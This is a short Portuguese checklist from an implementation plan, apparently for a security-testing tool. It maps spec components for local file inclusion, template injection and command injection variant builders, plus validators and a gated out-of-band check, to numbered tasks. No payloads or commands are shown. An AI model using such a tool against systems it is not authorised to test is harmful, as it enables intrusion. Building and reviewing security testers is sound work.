- **Cobertura do spec:** componente 1 (núcleo LFI/SSTI/cmdi) → Tasks 1/3/4; pré-requisito classify_vuln → Task 5; componente 2 (wiring) → Tasks 2/6; componente 3 (validadores) → Tasks 2/5; efeito colateral OOB de SSTI → ativado por Task 5 (gated, verificação anotada). Sem lacuna.
- **Placeholders:** nenhum — todo passo tem código/comando concreto.
- **Consistência de tipos:** `build_lfi_variants` → 2-tupla; `build_ssti_variants`/`build_cmdi_variants` → 3-tupla (com `expected`), consumidas com `lambda r: _co.<x>_effect(r, exp)`. Kwargs `lfi_oracle`/`ssti_oracle`/`cmdi_oracle` consistentes entre assinatura, ctx e call site nas Tasks 2/6.
